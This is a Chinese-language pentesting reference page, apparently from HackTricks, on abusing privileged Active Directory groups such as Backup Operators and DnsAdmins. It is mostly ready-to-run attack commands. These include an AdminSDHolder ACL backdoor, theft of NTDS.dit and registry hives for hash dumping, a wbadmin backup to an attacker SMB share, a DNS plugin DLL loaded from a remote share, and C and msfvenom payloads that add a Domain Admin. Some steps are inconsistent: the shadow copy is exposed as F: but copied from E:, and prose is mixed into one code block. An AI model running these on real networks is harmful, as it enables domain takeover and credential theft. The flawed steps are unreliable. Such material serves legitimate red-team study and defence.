# 特权组

{{#include ../../banners/hacktricks-training.md}}

## 具有管理权限的知名组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## 账户操作员

该组有权创建不是域管理员的账户和组。此外，它还允许在域控制器（DC）上进行本地登录。

要识别该组的成员，可以执行以下命令：
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
添加新用户是被允许的，同时也可以在 DC01 上进行本地登录。

## AdminSDHolder 组

**AdminSDHolder** 组的访问控制列表 (ACL) 至关重要，因为它为 Active Directory 中所有“受保护组”设置权限，包括高权限组。该机制通过防止未经授权的修改来确保这些组的安全。

攻击者可以通过修改 **AdminSDHolder** 组的 ACL 来利用这一点，向标准用户授予完全权限。这将有效地使该用户对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统的设计，他们将在一小时内自动恢复。

查看成员和修改权限的命令包括：
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
可以使用脚本来加快恢复过程：[Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1)。

有关更多详细信息，请访问 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)。

## AD 回收站

加入此组可以读取已删除的 Active Directory 对象，这可能会揭示敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 域控制器访问

除非用户是 `Server Operators` 组的一部分，否则对 DC 上文件的访问是受限的，这会改变访问级别。

### 权限提升

使用 Sysinternals 的 `PsService` 或 `sc`，可以检查和修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令和权限提升：
```cmd
C:\> .\PsService.exe security AppReadiness
```
此命令显示 `Server Operators` 拥有完全访问权限，允许操纵服务以获取提升的权限。

## 备份操作员

加入 `Backup Operators` 组可访问 `DC01` 文件系统，因为拥有 `SeBackup` 和 `SeRestore` 权限。这些权限使得文件夹遍历、列出和复制文件的能力成为可能，即使没有明确的权限，使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志。此过程需要使用特定的脚本。

要列出组成员，请执行：
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 本地攻击

要在本地利用这些权限，采用以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 访问并复制受限目录中的文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻击

直接访问域控制器的文件系统允许窃取 `NTDS.dit` 数据库，该数据库包含所有域用户和计算机的 NTLM 哈希。

#### 使用 diskshadow.exe

1. 创建 `C` 盘的影像副本：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从影子副本中复制 `NTDS.dit`：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制：
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以获取哈希：
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 从 `NTDS.dit` 中检索所有哈希：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### 使用 wbadmin.exe

1. 在攻击者机器上设置 NTFS 文件系统以用于 SMB 服务器，并在目标机器上缓存 SMB 凭据。
2. 使用 `wbadmin.exe` 进行系统备份和 `NTDS.dit` 提取：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

有关实际演示，请参见 [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)。

## DnsAdmins

**DnsAdmins** 组的成员可以利用他们的权限在 DNS 服务器上加载具有 SYSTEM 权限的任意 DLL，通常托管在域控制器上。此能力允许显著的利用潜力。

要列出 DnsAdmins 组的成员，请使用：
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意 DLL

成员可以使用以下命令使 DNS 服务器加载任意 DLL（无论是本地的还是来自远程共享的）：
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
重新启动 DNS 服务（这可能需要额外的权限）是加载 DLL 所必需的：
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
有关此攻击向量的更多详细信息，请参阅 ired.team。

#### Mimilib.dll

使用 mimilib.dll 进行命令执行也是可行的，可以修改它以执行特定命令或反向 shell。 [查看此帖子](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 获取更多信息。

### WPAD 记录用于 MitM

DnsAdmins 可以操纵 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行中间人 (MitM) 攻击。可以使用 Responder 或 Inveigh 等工具进行欺骗和捕获网络流量。

### 事件日志读取器
成员可以访问事件日志，可能会找到敏感信息，例如明文密码或命令执行详细信息：
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows 权限

该组可以修改域对象上的 DACL，可能授予 DCSync 权限。利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub 仓库。
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V 管理员

Hyper-V 管理员对 Hyper-V 拥有完全访问权限，这可以被利用来控制虚拟化的域控制器。这包括克隆实时域控制器和从 NTDS.dit 文件中提取 NTLM 哈希。

### 利用示例

Hyper-V 管理员可以利用 Firefox 的 Mozilla Maintenance Service 以 SYSTEM 身份执行命令。这涉及到创建一个指向受保护的 SYSTEM 文件的硬链接，并用恶意可执行文件替换它：
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
注意：硬链接利用在最近的Windows更新中已被缓解。

## 组织管理

在部署了**Microsoft Exchange**的环境中，一个特殊的组称为**组织管理**，拥有重要的能力。该组有权**访问所有域用户的邮箱**，并对“Microsoft Exchange安全组”组织单位（OU）拥有**完全控制权**。这种控制包括**`Exchange Windows Permissions`**组，可以被利用进行权限提升。

### 权限利用和命令

#### 打印操作员

**打印操作员**组的成员被赋予多个权限，包括**`SeLoadDriverPrivilege`**，允许他们**在域控制器上本地登录**、关闭它并管理打印机。为了利用这些权限，特别是当**`SeLoadDriverPrivilege`**在未提升的上下文中不可见时，必须绕过用户帐户控制（UAC）。

要列出该组的成员，可以使用以下PowerShell命令：
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
有关 **`SeLoadDriverPrivilege`** 的更详细利用技术，应该查阅特定的安全资源。

#### 远程桌面用户

该组的成员通过远程桌面协议 (RDP) 获得对 PC 的访问权限。要列举这些成员，可以使用 PowerShell 命令：
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
进一步了解利用 RDP 的信息可以在专门的渗透测试资源中找到。

#### 远程管理用户

成员可以通过 **Windows 远程管理 (WinRM)** 访问 PC。通过以下方式枚举这些成员：
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
对于与 **WinRM** 相关的利用技术，应咨询特定文档。

#### 服务器操作员

该组具有在域控制器上执行各种配置的权限，包括备份和恢复权限、改变系统时间和关闭系统。要枚举成员，可以使用以下命令：
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考文献 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)


{{#include ../../banners/hacktricks-training.md}}
